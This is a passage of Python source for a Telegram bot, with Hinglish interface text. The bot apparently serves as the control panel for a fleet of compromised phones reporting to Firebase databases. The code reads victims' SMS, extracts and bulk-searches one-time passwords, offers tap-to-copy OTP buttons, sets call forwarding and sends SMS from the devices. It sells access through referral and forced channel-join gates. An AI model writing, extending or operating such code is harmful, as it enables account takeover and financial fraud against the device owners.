        await safe_edit(
            query,
            f"🎁 <b>MY REFERRALS</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Qualified: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>\n\n"
            f"Your referral link:\n<code>{html_escape(link)}</code>\n\n"
            "Referral valid tab hoga jab referred user required join check complete karega.",
            reply_markup=referral_gate_keyboard(chat_id)
        )
        return

    if data == "req_acc":
        await query.answer("Request bhej di gayi ✅")
        u = update.effective_user
        uname = f"@{u.username}" if u and u.username else "no username"
        _fn = getattr(u, "full_name", None) or getattr(u, "first_name", "User")
        uname_line = f"👤 {html_escape(_fn)} ({uname})\n" if u else ""
        try:
            for owner_id in ADMIN_IDS:
                await ctx.bot.send_message(
                    owner_id,
                    f"🔔 <b>ACCESS REQUEST</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"{uname_line}"
                    f"🆔 <code>{chat_id}</code>\n"
                    f"🎁 Referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "<i>Grant dabao to user ko turant access mil jayega.</i>",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[
                        premium_button("Grant Access", callback_data=f"adm_grant_uid:{chat_id}", style="success"),
                        premium_button("Reject", callback_data=f"adm_rej_uid:{chat_id}", style="danger"),
                    ]]),
                )
            await safe_edit(
                query,
                "✅ <b>Request Sent</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Owner ko aapki request chali gayi hai.\n"
                "Approve hone par <b>Refresh Status</b> dabayein.",
                reply_markup=referral_gate_keyboard(chat_id),
            )
        except Exception:
            await query.answer("Request bheji gayi — owner approve karega.", show_alert=True)
        return

    if data.startswith("adm_grant_uid:") and is_admin:
        try:
            uid = int(data.split(":", 1)[1])
        except Exception:
            await query.answer("Invalid"); return
        grant_access(uid)
        all_users.setdefault(uid, {}).setdefault("referrals", [])
        save_data()
        await query.answer("✅ Access granted")
        try:
            await ctx.bot.send_message(
                uid,
                "✅ <b>ACCESS GRANTED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "Owner ne aapko access de diya hai.\n"
                "Ab <b>/start</b> bhejein — poora panel khul jayega.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        try:
            await safe_edit(query, f"✅ Access granted to <code>{uid}</code>")
        except Exception:
            pass
        return

    if data.startswith("adm_rej_uid:") and is_admin:
        try:
            uid = int(data.split(":", 1)[1])
        except Exception:
            await query.answer("Invalid"); return
        await query.answer("Rejected")
        try:
            await ctx.bot.send_message(
                uid,
                "❌ <b>Request Rejected</b>\n\n"
                f"Owner ne abhi access nahi diya.\n"
                f"Aap referrals complete karke dobara try kar sakte hain ({REQUIRED_REFERRALS} chahiye).",
                parse_mode="HTML",
            )
        except Exception:
            pass
        try:
            await safe_edit(query, f"❌ Rejected <code>{uid}</code>")
        except Exception:
            pass
        return

    if data == "noop": await query.answer(); return

    # Extra feature dispatcher (admin suite + user suite)
    try:
        if await extra_callbacks(update, ctx, data, chat_id, is_admin):
            return
    except Exception as e:
        _log(f"extra_callbacks error [{data}]: {type(e).__name__}: {e}")
    if data == "close_msg":
        await query.answer()
        try: await query.message.delete()
        except: pass
        return

    if not is_admin:
        ready, reason = await gate_state(ctx.bot, chat_id)
        if not ready:
            await query.answer("🔒 Pehle access requirements complete karein.", show_alert=True)
            return

    if not has_access(chat_id):
        await query.answer("🚫 Access nahi hai!", show_alert=True)
        return

    await query.answer()

    if data in ("home",) or data.startswith("backpg:") or data.startswith("pg:"):
        user_focus.pop(chat_id, None)
        pg = 0
        if data.startswith("backpg:") or data.startswith("pg:"):
            try: pg = int(data.split(":")[1])
            except: pg = 0
        user_page[chat_id] = pg
        devices = await get_all_devices(is_admin)
        await safe_edit(query, device_list_header(devices, pg), reply_markup=device_list_keyboard(devices, pg))
        return

    if data == "panels" or data.startswith("panels:"):
        user_focus.pop(chat_id, None)
        pg = 0
        if data.startswith("panels:"):
            try:
                pg = int(data.split(":", 1)[1])
            except Exception:
                pg = 0
        visible_tags = [t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS]
        total_panels = len(visible_tags)
        total_devs = sum(len(GLOBAL_DEVICE_CACHE.get(t, [])) for t in visible_tags)
        grand_online = sum(
            sum(1 for d in GLOBAL_DEVICE_CACHE.get(t, []) if d.status == "online")
            for t in visible_tags
        )
        per_page = 18
        total_pages = max(1, (total_panels + per_page - 1) // per_page)
        pg = max(0, min(pg, total_pages - 1))
        header = (f"{premium_emoji()} <b>ALL PANELS</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"📡 Panels: {total_panels}  |  📱 Devices: {total_devs}\n"
                  f"🟢 Online: {grand_online}  🔴 Offline: {total_devs - grand_online}\n"
                  f"📄 Page: <b>{pg + 1}/{total_pages}</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel pe click karo → us panel ke numbers dikhenge:")
        await safe_edit(query, header, reply_markup=panels_list_keyboard(is_admin=is_admin, page=pg))
        return

    if data == "online":
        devices = await get_all_devices(is_admin)
        await safe_edit(query, "🟢 ONLINE NUMBERS", reply_markup=online_only_keyboard(devices))
        return

    if data.startswith("panel:"):
        safe_tag = data[6:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        if original_tag in ADMIN_ONLY_TAGS and not is_admin:
            await query.answer("🚫 Aapke paas is panel ka access nahi hai!", show_alert=True)
            return
        devices = await get_panel_devices(original_tag)
        text = panel_numbers_text(original_tag, devices)
        await safe_edit(query, text, reply_markup=panel_numbers_keyboard(original_tag, devices))
        return

    if data.startswith("bulksearch_panel:") and is_admin:
        safe_tag = data[17:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        devices = await get_panel_devices(original_tag, is_admin=True)
        online_devices = [d for d in devices if d.status == "online" and d.numbers]
        if not online_devices:
            await safe_edit(
                query,
                f"📡 <b>{original_tag}</b>\n\n😴 Is panel mein koi online device nahi hai.",
                reply_markup=InlineKeyboardMarkup([[premium_button("🔙 Back", callback_data="bulksearch_back")]])
            )
            return

        try:
            await query.edit_message_text(
                f"⏳ <b>{original_tag}</b> panel check ho raha hai...\n"
                f"🟢 {len(online_devices)} online devices ke SMS check ho rahe hain...",
                parse_mode="HTML"
            )
        except Exception: pass

        sms_tasks = await asyncio.gather(*(get_device_sms(d, limit=20) for d in online_devices))
        today = datetime.now().date()
        yesterday = today - timedelta(days=1)
        tomorrow  = today + timedelta(days=1)

        matched_numbers = []
        for d, smss in zip(online_devices, sms_tasks):
            has_recent_otp = False
            latest_otp = None
            latest_date = None
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                otp = extract_otp(body)
                if otp and otp_in_date_range(sms):
                    has_recent_otp = True
                    latest_otp = otp
                    latest_date = sms_date(sms)
                    break
            if has_recent_otp:
                matched_numbers.append((d, latest_otp, latest_date))

        if not matched_numbers:
            result_text = (
                f"📡 <b>{original_tag}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🟢 Online check kiye: {len(online_devices)}\n"
                f"📅 Date range: {yesterday} → {tomorrow}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"❌ Kisi bhi online number pe aaj/kal/parson ka OTP nahi mila."
            )
            kb = InlineKeyboardMarkup([[premium_button("🔙 Back", callback_data="bulksearch_back"),
                                        premium_button("❌ Close", callback_data="close_msg")]])
            await safe_edit(query, result_text, reply_markup=kb)
            return

        lines = [
            f"✅ <b>Bulk Search — {original_tag}</b>",
            f"━━━━━━━━━━━━━━━━━━",
            f"🟢 Online checked: {len(online_devices)}",
            f"🎯 OTP mila (aaj/kal/parson): {len(matched_numbers)}",
            f"📅 Range: {yesterday} / {today} / {tomorrow}",
            f"━━━━━━━━━━━━━━━━━━",
        ]
        num_only_lines = []
        for i, (d, otp, dt) in enumerate(matched_numbers, 1):
            num_str = d.numbers[0] if d.numbers else d.name
            lines.append(f"{i}. 🟢 {num_str}  🔑 {otp}  📅 {dt}")
            num_only_lines.append(num_str)
        lines.append("━━━━━━━━━━━━━━━━━━")
        lines.append("📋 <b>Sirf Numbers (copy karo):</b>")
        lines.append("\n".join(num_only_lines))

        full_text = "\n".join(lines)
        rows = []
        for d, otp, dt in matched_numbers[:20]:
            lbl = f"🟢 {d.numbers[0] if d.numbers else d.name}  🔑 {otp}"
            rows.append([premium_button(lbl, callback_data=f"sel:{d.id}")])
        rows.append([premium_button("🔙 Back", callback_data="bulksearch_back"),
                     premium_button("❌ Close", callback_data="close_msg")])
        if len(full_text) > 4000:
            full_text = full_text[:3990] + "\n..."
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data == "bulksearch_back" and is_admin:
        header = (f"{premium_emoji()} <b>BULK SEARCH</b>\n"
                  f"━━━━━━━━━━━━━━━━━━\n"
                  f"Panel select karo — sirf online numbers jinka OTP\n"
                  f"aaj / kal / parson aaya ho, wahi milenge.\n"
                  f"━━━━━━━━━━━━━━━━━━")
        await safe_edit(query, header, reply_markup=bulksearch_panels_keyboard())
        return

    if data.startswith("panelref:"):
        safe_tag = data[9:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await safe_edit(query, "❌ Panel nahi mila.")
            return
        url = DATABASES.get(original_tag, "")
        if url:
            try:
                fresh = await fetch_db_data(original_tag, url)
            except Exception:
                fresh = None
            # Auto-remove protection: empty/failed refresh purane numbers
            # nahi udayega — purana cache hi dikhta rahega.
            if fresh:
                GLOBAL_DEVICE_CACHE[original_tag] = fresh
            elif original_tag not in GLOBAL_DEVICE_CACHE:
                GLOBAL_DEVICE_CACHE[original_tag] = []
        devices = await get_panel_devices(original_tag)
        text = panel_numbers_text(original_tag, devices)
        await safe_edit(query, text, reply_markup=panel_numbers_keyboard(original_tag, devices))
        return

    if data.startswith("sel:"):
        dev_id = data[4:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        # Fallback: agar ID badal gaya ho to number/label se match karo.
        if not device:
            device = next(
                (d for d in devices
                 if dev_id and (dev_id in d.id or dev_id in device_label(d))),
                None,
            )
        if not device:
            # Chup-chaap fail na ho — device list dobara dikhao.
            pg = user_page.get(chat_id, 0)
            await safe_edit(
                query,
                f"{premium_emoji()} <b>DEVICE LIST REFRESHED</b>\n" + "━"*18 +
                "\n⚠️ Ye device list me nahi mila (panel update ho gaya tha).\n"
                "Neeche se dobara select karein.",
                reply_markup=device_list_keyboard(devices, pg),
            )
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Aapke paas is device ka access nahi hai!", show_alert=True)
            return

        # NOTE: user_focus intentionally NOT set here — stops auto-forward spam on device open
        user_focus.pop(chat_id, None)
        back_page = user_page.get(chat_id, 0)

        latest_otp_line = ""
        latest_otp_val = None
        try:
            # Seed ALL recent SMS keys so old messages don't retrigger
            recent = await get_device_sms(device, limit=SMS_LIMIT)
            for sms_item in recent:
                sms_key = sms_item.get("_key", "")
                if sms_key:
                    seen_ids.add(seen_key(dev_id, sms_key))

            if recent:
                body = recent[0].get("body") or recent[0].get("message") or recent[0].get("text") or ""
                otp = extract_otp(body)
                if otp:
                    latest_otp_val = str(otp)
                    latest_otp_line = f"\n🔑 Latest OTP: <code>{otp}</code>\n{sms_date(recent[0])}"
        except Exception: pass

        text = (f"{premium_emoji()} <b>DEVICE TERMINAL</b>\n" + "━"*18 + "\n"
                f"Number: {device_label(device)}\nStatus: {device.status}\n"
                f"Server Node: {device.db_tag}{latest_otp_line}\n"
                + "━"*18 + "\n"
                f"🔄 Refresh dabao naya OTP dekhne ke liye.\n"
                f"📋 Neeche ke buttons se OTP/Number tap-to-copy karein.")
        await safe_edit(query, text, reply_markup=device_action_keyboard(
            dev_id, back_page, latest_otp=latest_otp_val, number=device_label(device)))
        return

    if data.startswith("msgs5:"):
        # ⚡ Last 5 OTPs — quick view, sirf OTP wale SMS
        dev_id = data[6:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Device nahi mila — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        smss = await get_device_sms(device, limit=30)
        otp_rows, otp_vals, body_lines = [], [], []
        for sms in smss:
            body = sms.get("body") or sms.get("message") or sms.get("text") or ""
            otp = extract_otp(body)
            if not otp:
                continue
            otp_vals.append(str(otp))
            body_lines.append(f"🔑 <code>{otp}</code>  ·  {sms_date(sms)}")
            otp_rows.append([premium_button(f"Copy OTP  {otp}", copy_text=str(otp), style="success")])
            if len(otp_vals) >= 5:
                break
        if not otp_vals:
            await safe_edit(
                query,
                f"⚡ <b>Last 5 OTPs</b>\n" + "━"*18 + "\n📭 Koi OTP nahi mila is device pe.",
                reply_markup=InlineKeyboardMarkup([[
                    premium_button("‹ Back to Terminal", callback_data=f"sel:{dev_id}")
                ]]),
            )
            return
        if len(otp_vals) > 1:
            otp_rows.append([premium_button(f"Copy All ({len(otp_vals)})",
                                            copy_text="\n".join(otp_vals), style="primary")])
        otp_rows.append([premium_button("‹ Back to Terminal", callback_data=f"sel:{dev_id}")])
        text = (f"⚡ <b>Last {len(otp_vals)} OTPs</b>\n" + "━"*18 + "\n"
                f"📱 {device_label(device)}\n" + "━"*18 + "\n"
                + "\n".join(body_lines)
                + "\n" + "━"*18 + "\n💡 Neeche button dabao — OTP seedha copy hoga.")
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(otp_rows))
        return

    if data.startswith("rec:"):
        # 📋 Recent OTPs — is device ke har number ka latest OTP
        dev_id = data[4:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Device nahi mila — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        smss = await get_device_sms(device, limit=30)

        def _ts(sm):
            try:
                t = float(sm.get("timestamp", 0))
                return t / 1000 if t > 1e11 else t
            except Exception:
                return 0.0

        best = {}
        for sm in smss:
            body = sm.get("body") or sm.get("message") or sm.get("text") or ""
            otp = extract_otp(body)
            if not otp:
                continue
            num = sm.get("number") or sm.get("sender") or device_label(device)
            ts = _ts(sm)
            if num not in best or ts > best[num][2]:
                best[num] = (str(otp), sm, ts)
        rows, lines = [], []
        for num, (otp, sm, ts) in sorted(best.items(), key=lambda kv: kv[1][2], reverse=True):
            lines.append(f"📞 <code>{html_escape(str(num))}</code>  🔑 <code>{otp}</code>  ·  {sms_date(sm)}")
            rows.append([premium_button(f"Copy {num} → {otp}", copy_text=str(otp), style="success")])
        if not lines:
            lines = ["📭 Koi recent OTP nahi mila."]
        rows.append([premium_button("‹ Back to Terminal", callback_data=f"sel:{dev_id}")])
        text = (f"📋 <b>Recent OTPs</b>\n" + "━"*18 + "\n"
                f"📱 {device_label(device)}\n" + "━"*18 + "\n"
                + "\n".join(lines)[:3600])
        await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("msgs:"):
        dev_id = data[5:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Device nahi mila — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        smss = await get_device_sms(device)
        if not smss:
            await safe_edit(query, "📭 No SMS found.",
                            reply_markup=InlineKeyboardMarkup([[premium_button("🔙 Back", callback_data=f"sel:{dev_id}")]]))
            return
        body_parts, otp_buttons, otp_values = [], [], []
        for sms in smss:
            block, otp = format_sms_block(sms, device_label(device))
            body_parts.append(block)
            if otp:
                otp_values.append(str(otp))
                # ⚡ TAP-TO-COPY: button khud OTP clipboard me copy karta hai
                otp_buttons.append([
                    premium_button(f"Copy OTP  {otp}", copy_text=str(otp), style="success")
                ])
        # ⚡ Tap-to-copy number
        otp_buttons.append([
            premium_button(f"Copy Number  {device_label(device)}",
                           copy_text=device_label(device), style="primary")
        ])
        # ⚡ Copy all OTPs at once
        if len(otp_values) > 1:
            otp_buttons.append([
                premium_button(f"Copy All OTPs ({len(otp_values)})",
                               copy_text="\n".join(otp_values), style="primary")
            ])
        otp_buttons.append([premium_button("🔙 Back to Terminal", callback_data=f"sel:{dev_id}")])
        full_text = "\n━━━━━━━━━━━━━━━━━━\n\n".join(body_parts)[:4000]
        await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons))
        return

    if data.startswith("info:"):
        dev_id = data[5:]
        devices = await get_all_devices(is_admin)
        device = next((d for d in devices if d.id == dev_id), None)
        if not device:
            await query.answer("⚠️ Device nahi mila — panel refresh karein.", show_alert=True)
            return
        if not is_admin and device.db_tag in ADMIN_ONLY_TAGS:
            await query.answer("🚫 Access nahi hai!", show_alert=True); return
        await query.message.reply_text(
            f"📱 Device Info:\n\n{device.device_info}\n🔋 Battery: {parse_battery(device.battery)}%\n📶 Network: {device.status}"
        )
        return

    if data.startswith("cf:"):
        pending_action[chat_id] = {"action": "execute_cf", "dev_id": data[3:]}
        await query.message.reply_text("📞 Forwarding number type karke send karein (e.g. `+919999911111`)")
        return

    if data.startswith("ss:"):
        pending_action[chat_id] = {"action": "execute_ss", "dev_id": data[3:]}
        await query.message.reply_text("💬 Format me send karein:\n`TARGET_NUMBER:MESSAGE_BODY`")
        return

    if data.startswith("cp:"):
        otp_val = data[3:]
        await query.answer("📋 Copy button ready")
        try:
            await query.message.reply_text(
                f"🔑 <b>OTP</b>  <code>{html_escape(otp_val)}</code>\n"
                f"<i>Neeche button dabao — seedha clipboard me copy ho jayega.</i>",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    premium_button(f"Copy OTP  {otp_val}", copy_text=otp_val, style="success")
                ]]),
            )
        except Exception:
            await query.answer(f"OTP: {otp_val}", show_alert=True)
        return

    # ── Keyword search confirm / cancel ─────────────────────────────────
    if data.startswith("kw_confirm:"):
        target_id = int(data[11:])
        if chat_id != target_id:
            await query.answer("Yeh aapka confirm nahi hai!", show_alert=True); return
        keyword = pending_kw_confirm.pop(chat_id, None)
        if not keyword:
            await query.answer("Session expire ho gaya. Dobara keyword daalo.", show_alert=True); return
        await query.answer("✅ Poora search shuru...")
        try: await query.message.delete()
        except: pass
        await _run_full_keyword_search(chat_id, keyword, is_admin, query.message.chat_id, ctx)
        return

    if data.startswith("kw_cancel:"):
        target_id = int(data[10:])
        if chat_id != target_id:
            await query.answer(); return
        pending_kw_confirm.pop(chat_id, None)
        await query.answer("❌ Search cancel ho gaya.", show_alert=True)
        try: await query.message.delete()
        except: pass
        return

    if data == "admin_force_join" and is_admin:
        await safe_edit(query, admin_force_join_text(), reply_markup=admin_force_join_keyboard())
        return

    if data == "admin_fj_toggle" and is_admin:
        FORCE_JOIN_ENABLED = not FORCE_JOIN_ENABLED
        save_data()
        await safe_edit(query, admin_force_join_text(), reply_markup=admin_force_join_keyboard())
        return

    if data == "admin_fj_add" and is_admin:
        pending_action[chat_id] = {"action": "add_force_join_channel"}
        _log(f"PENDING SET chat={chat_id} action=add_force_join_channel dict={pending_action}")
        await query.message.reply_text(
            "📢 <b>Add Force Join Channel</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Public channel (koi bhi format chalega):\n"
            "<code>@channelusername</code>\n"
            "<code>channelusername</code>\n"
            "<code>https://t.me/channelusername</code>\n\n"
            "Private channel:\n<code>-1001234567890 | https://t.me/+xxxxxxxx</code>\n\n"
            "✨ <b>Multi-Add:</b> Ek saath kitne bhi channels — har line pe ek:\n"
            "<code>@channel1\n@channel2\n@channel3\n@channel4</code>\n\n"
            "Public channel ke liye URL optional hai.\n"
            "Private channel ke liye invite URL zaroori hai.\n"
            "Cancel: /cancel",
            parse_mode="HTML"
        )
        return

    if data == "admin_fj_list" and is_admin:
        await query.answer()
        lines = ["📋 <b>FORCE JOIN CHANNELS</b>", "━━━━━━━━━━━━━━━━━━"]
        if not FORCE_JOIN_CHANNELS:
            lines.append("❌ No channels configured.")
        else:
            for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
                channel = html_escape(str(channel_data.get("channel", "") or ""))
                url = str(channel_data.get("url", "") or "")
                lines.append(f"<b>{index}.</b> <code>{channel}</code>")
                lines.append(f"   🔗 <code>{html_escape(url or get_force_join_url(channel_data))}</code>")
        await safe_edit(query, "\n".join(lines), reply_markup=admin_force_join_keyboard())
        return

    if data == "admin_fj_remove" and is_admin:
        if not FORCE_JOIN_CHANNELS:
            await query.answer("No channels configured.", show_alert=True)
            return

        rows = []
        for index, channel_data in enumerate(FORCE_JOIN_CHANNELS):
            channel = str(channel_data.get("channel", "") or "")
            if channel:
                rows.append([premium_button(
                    f"Remove {index + 1}. {channel}",
                    callback_data=f"admin_fj_del:{index}",
                    emoji_id="4956719506027185156",
                    style="danger"
                )])
        rows.append([premium_button(
            "Back",
            callback_data="admin_force_join",
            emoji_id="5372849966689566579",
            style="primary"
        )])
        await safe_edit(
            query,
            "🗑 <b>REMOVE FORCE JOIN CHANNEL</b>\n\nSelect a channel to remove:",
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("admin_fj_del:") and is_admin:
        try:
            index = int(data.split(":", 1)[1])
        except (ValueError, IndexError):
            await query.answer("Invalid channel.", show_alert=True)
            return

        if index < 0 or index >= len(FORCE_JOIN_CHANNELS):
            await query.answer("Channel not found.", show_alert=True)
            return

        removed = FORCE_JOIN_CHANNELS.pop(index)
        save_data()
        await query.answer("Channel removed.", show_alert=True)
        await safe_edit(
            query,
            f"✅ <b>Channel removed</b>\n\nRemoved: <code>{html_escape(str(removed.get('channel', '')))}</code>\n\n" + admin_force_join_text(),
            reply_markup=admin_force_join_keyboard()
        )
        return

    if data == "admin_referral" and is_admin:
        await safe_edit(query, admin_referral_text(), reply_markup=admin_referral_keyboard())
        return

    if data == "admin_ref_toggle" and is_admin:
        REFERRAL_ENABLED = not REFERRAL_ENABLED
        save_data()
        await safe_edit(query, admin_referral_text(), reply_markup=admin_referral_keyboard())
        return

    if data == "admin_ref_required" and is_admin:
        pending_action[chat_id] = {"action": "set_required_referrals"}
        await query.message.reply_text(
            f"👥 Required referrals bhejein. Current: <b>{REQUIRED_REFERRALS}</b>\n"
            "Example: <code>2</code>",
            parse_mode="HTML"
        )
        return

    if data == "admin_ref_stats" and is_admin:
        top = sorted(((uid, referral_count(uid)) for uid in all_users), key=lambda x: x[1], reverse=True)
        lines = ["🎁 <b>REFERRAL STATS</b>", "━━━━━━━━━━━━━━━━━━"]
        total = sum(c for _, c in top)
        lines.append(f"Qualified referrals: <b>{total}</b>")
        for uid, count in top[:20]:
            if count <= 0: continue
            name = html_escape(all_users.get(uid, {}).get("name", "Unknown"))
            lines.append(f"• {name} — <code>{uid}</code> — <b>{count}</b>")
        await safe_edit(query, "\n".join(lines), reply_markup=admin_referral_keyboard())
        return

    if data == "admin_refresh" and is_admin:
        await safe_edit(query, admin_panel_text(), reply_markup=admin_keyboard()); return

    if data == "admin_log_channel" and is_admin:
        state = f"<code>{LOG_CHANNEL_ID}</code>" if LOG_CHANNEL_ID else "<i>Not set</i>"
        rows = [
            [premium_button("Set / Change Log Channel", callback_data="admin_log_set", style="success")],
            [premium_button("Remove Log Channel", callback_data="admin_log_remove", style="danger")],
            [premium_button("Test Log Channel", callback_data="admin_log_test", style="primary")],
            [premium_button("‹ Back", callback_data="admin_refresh", style="primary")],
        ]
        await safe_edit(
            query,
            f"📜 <b>PRIVATE LOG CHANNEL</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"Current: {state}\n\n"
            "Join / referral / access events yahan post honge (quote format).\n"
            "Channel ID numeric hona chahiye (e.g. <code>-100123...</code>).\n"
            "Bot ko channel me <b>admin</b> banayein.",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return

    if data == "admin_log_set" and is_admin:
        pending_action[chat_id] = {"action": "set_log_channel"}
        await query.message.reply_text(
            "📜 <b>SET PRIVATE LOG CHANNEL</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Channel ID bhejein (e.g. <code>-1001234567890</code>)\n"
            "Ya channel ka koi message yahan <b>forward</b> karein.\n"
            "Hatane ke liye Admin Panel → Remove Log Channel.",
            parse_mode="HTML",
        )
        return

    if data == "admin_log_remove" and is_admin:
        LOG_CHANNEL_ID = 0
        save_data()
        await query.answer("Log channel removed", show_alert=True)
        await safe_edit(query, admin_panel_text(), reply_markup=admin_keyboard())
        return

    if data == "admin_log_test" and is_admin:
        if not LOG_CHANNEL_ID:
            await query.answer("Pehle log channel set karein", show_alert=True)
            return
        await query.answer("Sending test...")
        await send_private_log(
            ctx.bot,
            f"🧪 <b>LOG CHANNEL TEST</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"Time: <code>{datetime.now().strftime('%d %b %Y %I:%M:%S %p')}</code>\n"
            f"By: {format_user_log_line(update.effective_user)}\n"
            "✅ Private log channel working.",
        )
        await query.message.reply_text("✅ Test log bhej diya.", parse_mode="HTML")
        return

    if data == "admin_add_active_db" and is_admin:
        pending_action[chat_id] = {"action": "add_active_db"}
        await query.message.reply_text(
            "✅ <b>ADD ONLY ACTIVE FIREBASE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "URL ya <code>TAG=URL</code> lines bhejo (max ~20).\n"
            "Ya <b>.txt</b> file bhejo.\n\n"
            "Sirf <b>active</b> (HTTP 200) Firebase add honge — dead skip.\n"
            "Example:\n<code>ALPHA_X=https://xxx-default-rtdb.firebaseio.com</code>",
            parse_mode="HTML",
        )
        return

    if data == "admin_remove_dead_db" and is_admin:
        await query.answer("Scanning dead Firebase...")
        status = await query.message.reply_text(
            "🔍 Dead Firebase scan chal raha hai...", parse_mode="HTML"
        )
        removed_n, removed = await remove_dead_firebases()
        if removed_n == 0:
            body = (
                "✅ <b>REMOVE DEAD FIREBASE</b>\n━━━━━━━━━━━━━━━━━━\n"
                "Koi dead Firebase nahi mili. Sab active hain."
            )
        else:
            sample = ", ".join(html_escape(t) for t in removed[:15])
            extra = f" +{removed_n-15} more" if removed_n > 15 else ""
            body = (
                f"🗑 <b>REMOVED DEAD FIREBASE</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"Removed: <b>{removed_n}</b>\n"
                f"Left: <b>{len(DATABASES)}</b>\n"
                f"Tags: <code>{sample}{extra}</code>"
            )
        try:
            await status.edit_text(ensure_quote(body, "HTML"), parse_mode="HTML")
        except Exception:
            await query.message.reply_text(body, parse_mode="HTML")
        return

    if data == "admin_add_main_db" and is_admin:
        pending_action[chat_id] = {"action": "add_bulk_db"}
        await query.message.reply_text(
            "📝 Format:\n<code>TAG=https://your-url.firebaseio.com</code>\n\nEk sath max 20 URLs daal sakte hain.",
            parse_mode="HTML"
        ); return

    if data == "admin_grant_access" and is_admin:
        pending_action[chat_id] = {"action": "grant_access_pipe"}
        await query.message.reply_text(
            "✅ Jis user ko access dena hai uska <b>User ID</b> ya <b>@username</b> bhejein:\n"
            "(User ID: user jab /start karta hai to bot bata deta hai)",
            parse_mode="HTML"
        ); return

    if data == "admin_revoke_access" and is_admin:
        pending_action[chat_id] = {"action": "revoke_access_pipe"}
        await query.message.reply_text("❌ Jis user ka access hatana hai uska <b>User ID</b> ya <b>@username</b> bhejein:", parse_mode="HTML"); return

    if data == "admin_access_list" and is_admin:
        if not allowed_users:
            text = "🔐 <b>Access List</b>\n\nAbhi koi allowed user nahi hai."
        else:
            lines = ["🔐 <b>Allowed Users:</b>"]
            for uid in list(allowed_users)[:30]:
                udata = all_users.get(uid, {})
                name = udata.get("name", "Unknown")
                uname = udata.get("username", "")
                lines.append(f"• {name} (@{uname}) — <code>{uid}</code>")
            text = "\n".join(lines)
        await query.message.reply_text(text, parse_mode="HTML"); return

    if (data == "admin_setadmin_list" or data.startswith("setadmin:")) and is_admin:
        pg = 0
        if data.startswith("setadmin:"):
            try:
                pg = int(data.split(":", 1)[1])
            except Exception:
                pg = 0
        await safe_edit(query, admin_setadmin_text(), reply_markup=admin_setadmin_keyboard(page=pg)); return

    if data.startswith("toggleadmin:") and is_admin:
        safe_tag = data[12:]
        original_tag = find_tag_by_safe(safe_tag)
        if not original_tag:
            await query.answer("❌ Panel nahi mila!", show_alert=True); return
        if original_tag in ADMIN_ONLY_TAGS:
            ADMIN_ONLY_TAGS.discard(original_tag)
            await query.answer(f"🔓 '{original_tag}' ab sab ko visible hai!", show_alert=True)
        else:
            ADMIN_ONLY_TAGS.add(original_tag)
            await query.answer(f"🔒 '{original_tag}' ab Admin-Only hai!", show_alert=True)
        save_data()
        await safe_edit(query, admin_setadmin_text(), reply_markup=admin_setadmin_keyboard(page=0)); return

    if data == "admin_broadcast" and is_admin:
        pending_action[chat_id] = {"action": "broadcast_msg"}
        await query.message.reply_text(
            f"{premium_emoji()} <b>BROADCAST \u2014 EXACT COPY MODE</b>\n"
            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            "Ab jo message bhejna hai wo <b>jaisa hai waisa</b> yahan bhej dein:\n\n"
            "\u2022 Premium emoji \u2014 same rahenge\n"
            "\u2022 Inline buttons \u2014 same rahenge\n"
            "\u2022 Photo / Video / Document \u2014 same jayega\n"
            "\u2022 Rich formatting (bold, italic, code) \u2014 same rahegi\n"
